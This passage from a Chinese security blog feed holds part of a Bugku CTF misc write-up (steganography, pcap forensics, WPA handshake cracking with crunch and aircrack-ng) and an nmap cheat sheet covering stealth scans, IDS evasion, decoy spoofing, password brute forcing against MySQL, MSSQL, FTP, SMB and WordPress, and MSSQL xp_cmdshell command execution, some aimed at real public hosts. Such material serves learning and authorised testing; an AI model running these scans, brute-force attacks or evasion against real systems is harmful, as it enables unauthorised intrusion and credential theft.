title="猜"></a>猜</h3><p>下载图片通过百度对图片搜索功能<br>key{liuyifei}</p><h3 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h3><p>题目中给出一个conf.bin文件，主要是工具，用routerpassview打开，然后找到</p><p>（ <username val="053700357621">    <password val="210265">）题目中给出了提示，flag是宽带用户名。</password></username></p><p>flag{053700357621}</p><h3 id="隐写2-Welcome-jpg"><a href="#隐写2-Welcome-jpg" class="headerlink" title="隐写2 Welcome_.jpg"></a>隐写2 Welcome_.jpg</h3><p>从网站上下载下来就是一张图片，同过binwalk分析其中包含一个zip压缩包。</p><p>通过binwalk进行提取，会提取出三个文件，其中flag.rar与提示.jpg是CD24.zip压缩包的内容。</p><p>通过提示.jpg可以得到压缩包密码3位数，通过ARCHRP软件进行暴力破解获得密码为871.</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281801_848.png" alt=""></p><p>解压获得3.jpg</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804281803_237.png" alt=""></p><p>通过写字板打开获得f1@g{eTB1IEFyZSBhIGhAY2tlciE=} </p><p>很明显eTB1IEFyZSBhIGhAY2tlciE=是Base64加密，通过解密获得y0u Are a h@cker!</p><p>即f1@g{y0u Are a h@cker!}，提交时需要将f1@g变换为flag，即最终为flag{y0u Are a h@cker!}</p><h3 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h3><p>sublime打开<img src="http://oy0tigw51.bkt.clouddn.com/201804300041_863.png" alt=""></p><p>复制谷歌搜索得到一张二维码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300040_509.png" alt=""></p><p>可以将图片和base64互相转换的网站<br><a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="external">http://www.vgot.net/test/image2base64.php</a></p><p>最后得到二维码 扫描即可KEY{dca57f966e4e4e31fd5b15417da63269}</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>压缩包下载下来，解压，里面有一个flag文件，记事本打开，搜索flag没有，搜索key GET！</p><p>linux？ 不存在的…</p><pre><code>key{feb81d3834e2423c9903f4755464060b}</code></pre><p>方法二：</p><p>kali进行</p><p> tar -xvf 1.tar.gz </p><p>cat flag</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300111_333.png" alt=""></p><p>方法三：</p><p>放到linux里面strings打开，过滤一下KEY就找到了</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011620_101.png" alt=""></p><p>指令string flag | grep key</p><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>方法一：.pcapng又是数据包,wireshark打开，既然是用的菜刀，那就找http协议，第四个http包里找到了一句话木马： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300216_174.png" alt=""></p><p>flag应该在挂马之后才拿到，找到下一个http包，wireshark追踪一下http流： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300219_911.png" alt=""></p><p>可以知道菜刀创建了一个flag.tar.gz，还有echo了字符串<code>X@Y</code>，所以第三个包的response，出去前后两个字符串<code>X@Y</code>就是flag.tar.gz</p><p>然后把前后的“X@Y”删去，解码为压缩格式： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300215_384.png" alt=""></p><p>方法二：</p><p>用Wireshark打开分析 TCPstream</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300204_908.png" alt=""></p><p>在第九个数据包中看到了flag.tar.gz这个文件。</p><p>查看了一下其他数据包的内容，并没有关于传输这个文件的数据包信息。猜想这个文件可能被隐藏在caidao.pcapng里了。</p><p>放到binwalk分析，用dd命令把gzip文件提取出来。</p><blockquote><p>使用dd命令分离(linux/unix下)</p><p>dd命令分离出隐藏文件：</p><pre><code># dd if=carter.jpg of=output.jpg(自己定义的名字) skip=140147（对应的块偏移） bs=1</code></pre><p>-e选项可以用来执行自动数据提取的基础上提取规则中指定的默认的extract.conf文件：</p><pre><code>$ binwalk -e firmware.bin</code></pre></blockquote><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300156_242.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300157_912.png" alt=""></p><p>dd if=caidao.pcapng of=1.gzip skip=7747 bs=1</p><p>tar -xvf 1.gzip</p><p>cat flag/flag.txt </p><p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p><h3 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h3><p>根据提示要找getshell流，wireshark打开CTF.pcagng</p><p>先大致浏览一下，不难发现从第104个包开始应该是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300237_928.png" alt="">追踪流——&gt;TCP可以看到其中有一个s4cr4t.txt的文件，base64解码得到flag</p><p>Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</p><blockquote><p>CCTF{do_you_like_sniffer}</p></blockquote><h3 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h3><p>当时的第一感觉就是大白怎么只有头没有身子，所以想到修改图片的宽和高。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300226_978.png" alt=""></p><p>更改02 A7</p><p>获得flag{He1l0_d4_ba1}</p><h3 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h3><p>这里用Java Decompiler 工具反编译。</p><p>分析以上代码可以得知，其中period是表示坚持的秒数，根据题目提示可以知道，需要坚持60秒，所以根据period/10找到case 6，得到flag的BASE64码flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}，解码得flag{DajiDali_JinwanChiji}。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201804300246_552.png" alt=""></p><h3 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h3><p>提示WIFI密码为手机号。下载下来是一个cap包，用wireshark打开。WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下——</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011539_973.png" alt=""></p><p>正好四个包，接下来就是破解密码了，因为已经给了11位手机号的前七位，使用crunch生成一个密码字典，然后进行破解</p><p> crunch 11 11 -t 1391040%%%% &gt;&gt;wifipassword.txt</p><p>学习crunch命令网站：<a href="http://netsecurity.51cto.com/art/201706/541638.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201706/541638.htm</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011546_958.png" alt=""></p><p>aircrack-ng wifi.cap -w wifipassword.txt</p><p>参数选择3 因为前两个为空</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011612_324.png" alt=""></p><p> KEY FOUND! [ 13910407686 ]</p><p>也可使用脚本写字典</p><pre><code class="c"># include&lt;stdio.h&gt;int main(){        int i,j,k,l;        FILE *fp=NULL;        fp=fopen(&quot;words.txt&quot;,&quot;w&quot;);        for(i=0;i&lt;=9;i++)    {                for(j=0;j&lt;=9;j++)        {                        for(k=0;k&lt;=9;k++)            {                                for(l=0;l&lt;=9;l++)                {                                        fprintf(fp,&quot;1391040%d%d%d%d\n&quot;,i,j,k,l);                                }                        }                }        }    fclose(fp);}</code></pre><pre><code class="python">s = &quot;1391040&quot;t = &quot;&quot;file = open(&#39;data.txt&#39;,&#39;w&#39;)for i in range(10):    for j in range(10):        for k in range(10):            for l in range(10):                t = s + str(i) + str(j) + str(k) + str(l)                file.write(t)                file.write(&#39;\n&#39;)file.close()</code></pre><h3 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h3><p>下载文件使用notepad++查看</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011716_149.png" alt=""></p><p>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p><p>方法二：strings brave | grep KEY</p><h3 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h3><p>把cookie修改为管理员,然后提示下载exe文件</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805011722_15.png" alt=""></p><p>修改为true 得到下载地址，wireshark抓包随便填写账号密码抓包，筛选tcp流追踪一下</p><p>LOGIN下方是明显的BASE64编码，解码发现是一个163邮箱，取账+号密码，登陆后获取flag</p><p>flag{182100518+725593795416}</p><h3 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041929_134.png" alt=""></p><p>binwalk查看发现隐藏文件</p><p>foremost得到rar解压需要密码</p><p>右键查看照片属性</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041931_278.png" alt=""></p><p>base64解码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041933_188.png" alt=""></p><p>得到一个照片</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041935_321.png" alt=""></p><p>试一试修改高度</p><p>得到flag<img src="http://oy0tigw51.bkt.clouddn.com/201805041937_206.png" alt=""></p><p>BUGKU{a1e5aSA}</p><h3 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h3><p>binwalk分析隐藏压缩包，所以提取</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805041939_484.png" alt="">得到zip文件</p><p>unzip 00000079.zip</p><p>得到8张文件和一个gif</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051138_920.png" alt=""></p><p>追一分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051140_411.png" alt=""></p><p>发现88、888、8888是被修改过的图片。</p><p>1.88图片自带二维码，扫描得到  bilibili</p><p>2.888将其后缀名添加上.jpg，查看其属性，从备注中获得一个使用base64加密的密文，解密得到silisili</p><p>3.8888有个压缩包，解压得到一张二维码得到panama</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805051144_91.png" alt=""></p><p>最后根据题目提示的进行组合，得到 flag{bilibili_silisili_panama}</p><h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>图片的标题图穷flag见</p><p>以及题目图穷匕见都暗示该图片在文件末尾隐藏了信息，主题会画图吗的作用下文再分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805020025_829.png" alt=""></p><p>winhex打开，找到jpg的文件尾FF D9，发现其后还有大量的数据</p><p>复制保存到txt中尝试将数据按16进制-&gt;ASCII方式解码，思路就很明显了，使用的是notepad++中的插件Converter进行解码HEX-&gt;ASCII</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805042005_925.png" alt=""></p><p>这时候再结合会画图吗的提示，将这些坐标做成一张图即可，</p><p>用gnuplot这个工具比较方便，因此将坐标转为gnuplot能识别的格式 坐标1 坐标2</p><p>所以需要替换格式</p><p>替换</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061413_574.png" alt=""></p><p>kali安装gnuplot：sudo apt-get install gnuplot-x11 </p><p>plot “/root/Desktop/111.txt”  </p><p>但windows下是使用 plot “C:\\Users\\Asus\\Desktop\\111.txt”  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061427_357.png" alt=""></p><p>flag{40fc0a979f759c8892f4dc045e28b820}  </p><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><p>通过网址，可以看到一个convert.txt文件，文件内容为二进制</p><p>将所有的二进制串转化为十六进制串</p><p>十六进制串写入到一个rar的压缩包中,解压压缩包我们可以看到一个CTF图片: </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061458_280.png" alt=""></p><p>试一试右键属性发现base64编码的一段文字 解码。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061459_512.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061500_151.png" alt=""></p><p>flag{01a25ea3fd6349c6e635a1d0196e75fb}</p><pre><code class="python">import binascii__author__ = &#39;Mang0&#39;# !/usr/bin/env python# -*- coding: utf-8 -*-base = [str(x) for x in range(10)] + [chr(x) for x in range(ord(&#39;A&#39;), ord(&#39;A&#39;) + 6)]# bin2decdef bin2dec(string_num):    return str(int(string_num, 2))# hex2decdef hex2dec(string_num):    return str(int(string_num.upper(), 16))# dec2bindef dec2bin(string_num):    num = int(string_num)    mid = []    while True:        if num == 0: break        num, rem = divmod(num, 2)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# dec2hexdef dec2hex(string_num):    num = int(string_num)    mid = []    while True:        if num == 0:            break        num, rem = divmod(num, 16)        mid.append(base[rem])    return &#39;&#39;.join([str(x) for x in mid[::-1]])# hex2tobindef hex2bin(string_num):    return dec2bin(hex2dec(string_num.upper()))# bin2hexdef bin2hex(string_num):    return dec2hex(bin2dec(string_num))if __name__ == &#39;__main__&#39;:    file1 = open(&#39;convert.txt&#39;)    s = file1.read()    hexx = bin2hex(s)    print (hexx)    file2 = open(&#39;4.rar&#39;, &#39;wb&#39;)    file2.write(binascii.a2b_hex(hexx))</code></pre><h3 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h3><p>通过网址，下载wav的音乐源文件：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061513_376.png" alt=""></p><p>通过Audacity软件打开音乐源文件，我们可以看到源文件中插入了一串东西：</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061513_11.png" alt=""></p><p>放大观察，我们很容易想到是一串摩斯密码（短横杠代表<code>.</code>，长横杠代表<code>-</code>，中间代表空格）</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061514_267.png" alt=""></p><p>按照规律得到摩斯密码为：</p><pre><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></pre><p>解密后的字符串得到flag：<img src="http://oy0tigw51.bkt.clouddn.com/201805061518_97.png" alt=""></p><p>5BC925649CB0188F52E617D70929191C</p><h3 id="好多数值"><a href="#好多数值" class="headerlink" title="好多数值"></a>好多数值</h3><p> 打开记事本发现是一串0-255的数字，推测是RGB的数字表示形式。每组数据对应一个像素点，图片宽度推测503*122，撸个python脚本</p><pre><code>from PIL import Imageimport rex = 503 #x坐标  通过对txt里的行数进行整数分解y = 122 #y坐标  x*y = 行数im = Image.new(&quot;RGB&quot;,(x,y))#创建图片file = open(&#39;misc100.txt&#39;) #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x):    for j in range(0,y):        line = file.readline()#获取一行        rgb = line.split(&quot;,&quot;)#分离rgb        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show()</code></pre><p>flag{youc@n’tseeme}</p><h3 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061547_404.jpg" alt=""></p><p>binwalk分析</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061546_905.png" alt=""></p><p>得到一个rar文件</p><p>解码密码不知道 右键图片属性也没有 爆破也没得到</p><p>后来网上查到密码就是“喜欢我吗.”尝试一下，将文本解压出来 </p><blockquote><p>嘟嘟嘟嘟<br>士兵：报告首长！已截获纳粹的加密电报！<br>首长：拿来看看</p><p>电报内容：<br>…./-/-/.–./—…/-..-./-..-././-./-.-./—/-.././.-.-.-/-.-./…./.-/…./..-/—/.-.-.-/-.-./—/–/-..-.</p><p>首长：我操你在逗我吗？你确定是他们纳粹发的吗？<br>士兵：难道我弄错了？哦。。。等等是这一条</p><p>内容：<a href="http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="external">http://c.bugku.com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a><br>      AES Key：@#@#￥%……￥￥%%……&amp;￥</p><p>士兵：二维码真的扫不出来吗？？肯定可以扫出来</p></blockquote><p>第一个电报密文很明显就是莫斯密码工具解密，得到一个网站：HTTP://ENCODE.CHAHUO.COM/ </p><p>AES加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805061550_867.png" alt=""></p><p>momoj2j.png </p><p>那么真正网址就是<a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="external">http://c.bugku.com/momoj2j.png</a></p><p>访问后出现一个二维码，直接扫码，什么都扫不出来</p><p>反色得到flag</p><p>KEY{nitmzhen6}  </p><h3 id="很普通的数独-ISCCCTF"><a href="#很普通的数独-ISCCCTF" class="headerlink" title="很普通的数独(ISCCCTF)"></a>很普通的数独(ISCCCTF)</h3><p>下载zip，增加.zip得到25张数独的照片</p><p>确实没想到找了资料</p><p><a href="http://blog.chrstm.com/2017/05/29/ISCC2017/" target="_blank" rel="external">http://blog.chrstm.com/2017/05/29/ISCC2017/</a></p><p><a href="http://isron.cn/2017/05/24/ISCC-shudu/" target="_blank" rel="external">http://isron.cn/2017/05/24/ISCC-shudu/</a></p><p>base64编码的字符串：  Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9  经过7次解码之后就得到flag  <strong>flag：flag{y0ud1any1s1}</strong> </p><h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>发现一共解压出来68个zip压缩包。当我们尝试打开压缩包时，提示我们输入密码 </p><p>crc32碰撞，暴力破解得到base64 ，解码十六进制</p><ul><li>cf907300000d00000000000000aa3e7a008023004900000054000000028634abfe6b631d491d33030001000000434d54091514cbdd414f952448d3e88f984511514146f79f1d20427c6d2bb869ca9f282c3328fc4816991f1b181d8f382c4676e1c5ed674d72de4d4ad58274be92bd1f0a94cdbeaef73f22804af77420902d001d0000001d0000000262d1e7d54f631d491d30080020000000666c61672e74787400b0346966666978207468652066696c6520616e64206765742074686520666c6167c43d7b00400700a</li></ul><p>之后补上文件头后解压</p><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://blog.csdn.net/xuqi7/article/details/71436020" target="_blank" rel="external">CTF—图片相关</a></p><p><a href="https://my.oschina.net/ososchina/blog/801358" target="_blank" rel="external">PNG图片文件结构分析</a></p><p><a href="https://www.anquanke.com/post/id/86211" target="_blank" rel="external">CTF比赛中关于zip的总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nmap 使用技巧汇总</title>
      <link href="/archives/40a439a4/"/>
      <url>/archives/40a439a4/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-使用技巧汇总"><a href="#Nmap-使用技巧汇总" class="headerlink" title="Nmap 使用技巧汇总"></a>Nmap 使用技巧汇总</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><pre><code>1. 全面扫描/综合扫描nmap -A 192.168.1.1032. Ping扫描nmap -sP 192.168.1.1/243. 免Ping扫描，穿透防火墙，避免被防火墙发现nmap -P0 192.168.1.1034. TCP SYN Ping 扫描nmap -PS -v 192.168.1.103nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃RST包）5. TCP ACK Ping 扫描nmap -PA -v 192.168.1.1036. UDP Ping 扫描nmap -PU -v 192.168.1.1037. ICMP Ping Types 扫描nmap -PU -v 192.168.1.103    (ICMP ECHO)nmap -PP -v 192.168.1.103    (ICMP 时间戳)nmap -PM -v 192.168.1.103    (ICMP 地址掩码)8. ARP Ping 扫描nmap -PR -v 192.168.1.1039. 列表 扫描nmap -sL -v 192.168.1.10310. 禁止方向域名解析nmap -n -sL -v 192.168.1.10311. 方向域名解析nmap -R -sL -v 192.168.1.10312. 使用系统域名解析系统nmap --system-dns 192.168.1.2 192.168.1.10313. 扫描IPV6地址nmap -6 IPv614. 路由跟踪nmap --traceroute -v www.sunbridgegroup.com15. SCTP INIT Ping 扫描nmap -PY -v 192.168.1.103</code></pre><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><pre><code>1. 时序扫描nmap -T(0-5) 192.168.1.1032. 常用扫描方式nmap -p 80 192.168.1.103nmap -p 80-100 192.168.1.103nmap -p T:80,U:445 192.168.1.103nmap -F 192.168.1.1.103    (快速扫描)nmap --top-ports 100 192.168.1.103    (扫描最有用的前100个端口)3. TCP SYN 扫描 （高效的扫描方式）[半开链接扫描]nmap -sS -v 192.168.1.1034. TCP 连接扫描[全连接扫描]nmap -sT -v 192.168.1.1035. UDP 连接扫描nmap -sU -p 80-100 192.168.1.1036. 隐蔽扫描nmap -sN 61.241.194.153(NULL扫描)nmap -sF 61.241.194.153(FIN扫描)nmap -sX 61.241.194.153(Xmas扫描)7. TCP ACK 扫描nmap -sA 192.168.1.1038. TCP 窗口扫描nmap -sW -v -F  192.168.1.1039. TCP Maimon 扫描nmap -sM -T4  192.168.1.10310. 自定义 扫描nmap -sT --scanflags SYNURG 192.168.1.10311. 空闲 扫描( 隐藏IP )nmap -sI www.0day.co:80 192.168.1.10312. IP协议 扫描nmap -sO -T4 192.168.1.10313. FTP Bounce 扫描(已经不被支持)</code></pre><h2 id="三、指纹识别与探测"><a href="#三、指纹识别与探测" class="headerlink" title="三、指纹识别与探测"></a>三、指纹识别与探测</h2><pre><code>1. 版本探测（显示banner信息）nmap -sV 192.168.1.103nmap -sV -A 192.168.1.1032. 全端口版本探测nmap -sV --allports 192.168.1.1033. 设置扫描强度nmap -sV --version-intensity (0-9) 192.168.1.1034. 轻量级扫描nmap -sV --version-light 2 192.168.1.1035. 重量级扫描nmap -sV --version-all 192.168.1.1036. 获取详细版本信息nmap -sV --version-trace 192.168.1.1037. RPC扫描nmap -sS -sR 192.168.1.1038. 对指定的目标进行操作系统监测nmap -O --osscan-limit 192.168.1.1039. 推测系统并识别nmap -O --osscan-guess 192.168.1.103</code></pre><h2 id="四、伺机而动"><a href="#四、伺机而动" class="headerlink" title="四、伺机而动"></a>四、伺机而动</h2><pre><code>1. 调整并行扫描组的大小nmap --min-hostgroup 30 192.168.1.110/24nmap --max-hostgroup 30 902 192.168.1.1042. 调整探测报文的并行度nmap --min-parallelism 100 192.168.1.104nmap --max-parallelism 100 192.168.1.1043. 调整探测报文超时nmap --initial-rtt-timeout 100ms 192.168.1.104nmap --max-rtt-timeout 100ms 192.168.1.104nmap --min-rtt-timeout 100ms 192.168.1.1044. 放弃缓慢的目标主机nmap --host-timeout 1800000ms 192.168.1.1045. 调整报文适合时间间隔nmap --scan-delay 1s 192.168.1.104nmap --max-scan-delay 1s 192.168.1.104</code></pre><h2 id="五、防火墙-IDS逃逸"><a href="#五、防火墙-IDS逃逸" class="headerlink" title="五、防火墙/IDS逃逸"></a>五、防火墙/IDS逃逸</h2><pre><code>1. 报文分段nmap -f -v 61.241.194.1532. 指定偏移大小nmap --mtu 16 192.168.1.1043. IP欺骗nmap -D RND:11 192.168.1.104nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.1044. 源地址欺骗nmap -sI www.0day.cn:80 192.168.1.1045. 源端口欺骗nmap --source-port 902 192.168.1.1046. 指定发包长度nmap --data-length 30 192.168.1.1047. 目标主机随机排序nmap --randomize-hosts 192.168.1.1048. MAX地址欺骗nmap -sT -Pn --spoof-mac 0 192.168.1.104</code></pre><h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a>六、信息收集</h2><pre><code>1. IP信息收集nmap --script ip-geolocation-* www.pcos.cn2. WHOIS 查询nmap --script whois-domain www.pcos.cnnmap --script whois-domain --script-args whois.whodb=nofollow www.ithome.comnmap -sn --script whois-domain -v -iL host.txt3. 搜索邮件信息(新版可能没有这个模块)nmap --script http-email-harvest www.pcos.cn4. IP反查nmap -sn --script hostmap-ip2hosts www.pcos.cn5. DNS信息收集nmap --script dns-brute www.pcos.cnnmap --script dns-brute dns-brute.threads=10 www.pcos.cnnmap --script dns-brute dns-brute.threads=10,dns-brute.hostlis www.pcos.cn6. 检索系统信息nmap -p 445 445 192.168.1.104 --script membase-http-info7. 后台打印机服务漏洞nmap --script smb-security-mode.nse -p 445 119.29.155.458. 系统漏洞扫描nmap --script smb-check-vulns.nse -p 445 119.29.155.459.扫描Web漏洞nmap -p80 --script http-stored-xss.nse/http-sql-injection.nse 119.29.155.4510. 通过 Snmp 列举 Windows 服务/账户nmap -sU -p 161 --script=snmp-win32-services 192.168.1.104nmap -sU -f -p 161 --script=snmp-win32-users 192.168.1.11011. 枚举 DNS 服务器的主机名nmap --script dns-brute --script-args dns-brute.domain=baidu.com12. HTTP信息收集nmap -sV -p 80 www.0day.com (HTTP版本探测)nmap -p 80 --script=http-headers www.pcos.cn (HTTP信息头探测)nmap -p 80 --script=http-sitemap-generator www.pcos.cn (爬行Web目录结构)13. 枚举SSL密钥nmap -p 443 --script=ssl-enum-ciphers www.baidu.com14. SSH服务密钥信息探测map -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 127.0.0.1</code></pre><h2 id="七、数据库渗透测试"><a href="#七、数据库渗透测试" class="headerlink" title="七、数据库渗透测试"></a>七、数据库渗透测试</h2><pre><code>1. Mysql列举数据库nmap -p3306 --script=mysql-databases --script-args mysqluser=root,mysqlpass 192.168.1.1012. 列举 MySQL 变量nmap -p3306 --script=mysql-variables 192.168.1.3nmap -sV --script=mysql-variables 192.168.1.3 (无法确定端口的情况下)3. 检查 MySQL 密码nmap -p3306 --script=mysql-empty-password 192.168.1.3nmap -sV -F -T4 --script=mysql-empty-password 192.168.1.34. 审计 MySQL 密码nmap --script=mysql-brute 192.168.1.101nmap -p3306 --script=mysql-brute userdb=/root/passdb.txt passdb=/root/pass.txt 192.168.1.101 (指定字典)5. 审计 MySQL 安全配置nmap -p3306 --script mysql-audit --script-args &quot;mysql-audit.username=&#39;root&#39;,mysql-audit.password=&#39;123&#39;,mysql-audit.filename=&#39;nselib/data/mysql-cis.audit&#39;&quot; 192.168.1.1046. 审计 Oracle 密码nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test 192.168.1.121nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=/tmp/usernames.txt,passdb=/tmp/password.txt 192.168.1.1057. 审计 msSQL密码nmap -p 1433 --script ms-sql-brute --script-args userdb=name.txt,passdb=pass.txt 192.168.1.1048. 检查 msSQL空密码nmap -p 1433 --script ms-sql-empty-password 192.168.1.1049. 读取 msSQL 数据nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.Password=sa 192.168.1.10110. 读取 msSQL 执行系统命令nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;ipconfig&quot; 192.168.1.10111. 审计 PgSQL 密码nmap -p 5432 --script pgsql-brute 192.168.1.101</code></pre><h2 id="八、渗透测试"><a href="#八、渗透测试" class="headerlink" title="八、渗透测试"></a>八、渗透测试</h2><pre><code>1. 审计 HTTP 身份验证nmap --script=http-brute -p 80 www.pcos.cn2. 审计 FTP 服务器nmap --script ftp-brute -p 21 192.168.1.101nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 192.168.1.101nmap --script=ftp-anon 192.168.1.1013. 审计 Wordpress 程序nmap -p80 --script http-wordpress-brute 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=10 192.168.1.1104. 审计 Joomla 程序nmap -p80 --script http-joomla-brute 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt 192.168.1.110nmap -p80 --script http-joomla-brute --script-args uesrdb=user.txt,passdb=passwd.txt,http-joomla-brute.threads=5 192.168.1.1105. 审计 邮件服务器 nmap -p110 --script=pop3-brute 192.168.1.1106. 审计 SMB 口令nmap --script smb-brute.nse -p 445 192.168.1.110nmap --script smb-brute.nse --script-args passdb=pass.txt -p 445 192.168.1.1107. 审计 VNC 服务nmap --script vnc-brute -p 5900 192.168.1.1108. 审计 SMTP 服务器nmap -p 25 --script smtp-brute 192.168.1.110nmap -p 25 --script=smtp-enum-users.nse smith.jack.com (枚举远程系统所有用户)9. 检测 Stuxnet 蠕虫nmap --script stuxnet-detect -p 445 192.168.1.11010. SNMP 服务安全审计nmap -sU -p 161 --script=snmp-netstat 192.168.1.101 (获取目标主机网络连接状态)nmap -sU -p 161 --script=snmp-processes 192.168.1.110 (枚举目标主机的系统进程)nmap -sU -p 161 --script=snmp-win32-services 192.168.1.110 (获得windows服务器的服务)nmap -sU -p 161 --script snmp-brute 192.168.1.110</code></pre><h2 id="九、Zenmap"><a href="#九、Zenmap" class="headerlink" title="九、Zenmap"></a>九、Zenmap</h2><pre><code>1. Intense scan (详细扫描)nmap -T4 -A -v 192.168.1.1012. Intense scan plus UDP (UDP扫描经典使用)nmap -sS -sU -T4 -A -v 192.168.1.1013. Intense scan, all TCP ports (TCP扫描)nmap -p 1-65535 -T4 -A -v 192.168.1.1014. Intense scan, no ping (无Ping扫描)nmap -T4 -A -v -Pn 192.168.1.1015. Ping scan (Ping扫描)nmap -sn 192.168.1.101/246. Quick scannmap -T4 -F 192.168.1.101/247. Quick scan 